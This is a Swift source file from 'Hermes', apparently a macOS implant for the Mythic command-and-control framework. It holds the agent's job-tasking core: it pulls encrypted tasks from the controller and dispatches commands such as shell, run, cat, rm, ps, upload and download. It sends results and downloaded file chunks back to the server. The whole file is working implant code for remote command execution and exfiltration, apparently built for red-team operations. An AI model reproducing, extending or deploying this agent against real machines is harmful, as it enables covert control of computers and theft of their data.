//
//  jobs.swift
//  Hermes
//
//  Created by slyd0g on 6/1/21.
//

import Foundation

class Job {
    var jobID: Int
    var taskID: String
    var command: String
    var parameters: String
    var result: String
    var status: String // error
    var completed: Bool
    var started: Bool
    var success: Bool
    var thread: Thread?
    var processes = [JSON]()
    var fileBrowser: JSON
    var removedFiles: JSON
    var chunkNumber: Int
    var totalChunks: Int
    var fullPath: String
    var host: String
    var isScreenshot: Bool
    var fileID: String
    var chunkData: String
    var fileSize: Int
    
    init() {
        self.jobID = 0
        self.taskID = ""
        self.command = ""
        self.parameters = ""
        self.result = ""
        self.status = ""
        self.completed = false
        self.started = false
        self.success = false
        self.fileBrowser = [:]
        self.removedFiles = [:]
        self.chunkNumber = 0
        self.totalChunks = 0
        self.fullPath = ""
        self.host = ""
        self.isScreenshot = false
        self.fileID = ""
        self.chunkData = ""
        self.fileSize = 0
    }
}

class JobList {
    var jobCount = 0
    var jobs = [Job]()
}

func getTasking(jobList: JobList) throws {
    // Create JSON payload
    let jsonPayload = JSON([
        "action": "get_tasking",
        "tasking_size": -1,
    ])
    
    // Decode negotiated b64 session key from agent config
    let sessionKey = fromBase64(data: agentConfig.encodedAESKey)
    
    // Send Hermes message, get Mythic response, decrypt and decode
    let jsonResponse = sendHermesMessage(jsonMessage: jsonPayload, payloadUUID: toData(string: agentConfig.payloadUUID), decodedAESKey: sessionKey, httpMethod: "get")
    print("GET_TASKING", jsonResponse)
    let jsonTasks = jsonResponse["tasks"]
    
    // Loop through tasks
    for(_, tasks):(String, JSON) in jsonTasks {
        let job = Job.init()
        job.jobID = jobList.jobCount
        job.command = tasks["command"].stringValue
        job.parameters = tasks["parameters"].stringValue
        job.taskID = tasks["id"].stringValue
        
        // Add jobs to the job list and increase jobCount by 1
        jobList.jobs.append(job)
        jobList.jobCount += 1
    }
}

func executeJob(jobList: JobList) {
    // Setup DispatchQueue to run async threads
    let queue = DispatchQueue(label: "", qos: .utility, attributes: .concurrent)
    
    // Loops through all jobs
    for job in jobList.jobs {
        // Start any untasked jobs
        if !job.completed {
            job.started = true
            queue.async {
                job.thread = Thread.current
                executeTask(job: job, jobList: jobList)
            }
        }
    }
}

func executeTask(job: Job, jobList: JobList) {
    switch job.command {
    case "pwd":
        pwd(job: job)
    case "cd":
        cd(job: job)
    case "exit":
        exit(job: job)
    case "cat":
        cat(job: job)
    case "run":
        runBinary(job: job)
    case "shell":
        shell(job: job)
    case "list_apps":
        listApplications(job: job)
    case "ps":
        ps(job: job)
    case "sleep":
        sleep(job: job)
    case "jobs":
        listJobs(job: job, jobList: jobList)
    case "jobkill":
        jobKill(job: job, jobList: jobList)
    case "ls":
        ls(job: job)
    case "rm":
        rm(job: job)
    case "download":
        // Download job has no file_id from Mythic yet, we need to get one, if we have a file_id, get a chunk
        if job.fileID == "" {
            getFileID(job: job)
        }
        // If job already has a file_id, download a chunk of the file
        else {
            downloadChunk(job: job)
        }
    case "upload":
        upload(job: job)
    default:
        job.result = "Command not implemented."
        job.status = "error"
        job.completed = true
        job.success = false
    }
}

func postResponse(jobList: JobList) {
    var jsonJobOutput = [JSON]()
    
    // Loop through all jobs and filter for completed
    for job in jobList.jobs {
        // Normal completed jobs
        if job.completed {
            let jsonResponse = JSON([
                "task_id": job.taskID,
                "user_output": job.result,
                "completed": job.success,
                "status": job.status,
                "processes": job.processes,
                "file_browser:": job.fileBrowser,
                "removed_files": job.removedFiles,
            ])
            jsonJobOutput.append(jsonResponse)
        }
        
        // Handle download jobs
        if job.command == "download" {
            // We don't have a file_id yet, request one from Mythic
            if ((job.fileID == "") && (job.totalChunks > 0)) {
                let jsonResponse = JSON([
                    "total_chunks": job.totalChunks,
                    "task_id": job.taskID,
                    "full_path": job.fullPath,
                    "host": job.host,
                    "is_screenshot": job.isScreenshot,
                ])
                jsonJobOutput.append(jsonResponse)
            }
            // Send file chunk
            else if((job.fileID != "") && (job.totalChunks > 0)) && (job.chunkData != "") {
                let jsonResponse = JSON([
                    "chunk_num": job.chunkNumber,
                    "file_id": job.fileID,
                    "chunk_data": job.chunkData,
                    "task_id": job.taskID,
                ])
                jsonJobOutput.append(jsonResponse)
                job.chunkNumber = job.chunkNumber + 1
            }
        }
        
    }
    
    let jsonPayload = JSON([
        "action": "post_response",
        "responses": jsonJobOutput,
    ])
    print("HERMES_POST_RESPONSE", jsonPayload)
    // Decode negotiated b64 session key from agent config
    let sessionKey = fromBase64(data: agentConfig.encodedAESKey)
    
    // Send Hermes message, get Mythic response, decrypt and decode
    let jsonResponse = sendHermesMessage(jsonMessage: jsonPayload, payloadUUID: toData(string: agentConfig.payloadUUID), decodedAESKey: sessionKey, httpMethod: "post")
    print("MYTHIC_POST_RESPONSE", jsonResponse)
    let jsonResponses = jsonResponse["responses"]
    
    // Process Mythic response
    for(_, responses):(String, JSON) in jsonResponses {
        // Find success message from Mythic
        if responses["status"].stringValue == "success" {
            // Loop through Hermes jobs
            for (index, job) in jobList.jobs.enumerated() {
                // Found a job that succeeded and matched with task_id
                if responses["task_id"].stringValue == job.taskID {
                    // Delete job if it is a "normal" job
                    if job.command != "download" {
                        jobList.jobs.remove(at: index)
                        print("job removed")
                    }
                    // Handle download responses
                    else if job.command == "download" {
                        // Save file_id returned from Mythic for first download message
                        if ((job.fileID == "") && (responses["file_id"].exists())) {
                            job.fileID = responses["file_id"].stringValue
                            print("SAVING_FILEID", job.fileID)
                        }
                        // Delete job if download task is complete
                        else if job.chunkNumber > job.totalChunks {
                            jobList.jobs.remove(at: index)
                            print("download job removed")
                        }
                        // Error may have occurred when getting file_id from Mythic, remove the job
                        else if job.totalChunks == 0 {
                            jobList.jobs.remove(at: index)
                        }
                    }
                }
            }
        }
    }
}
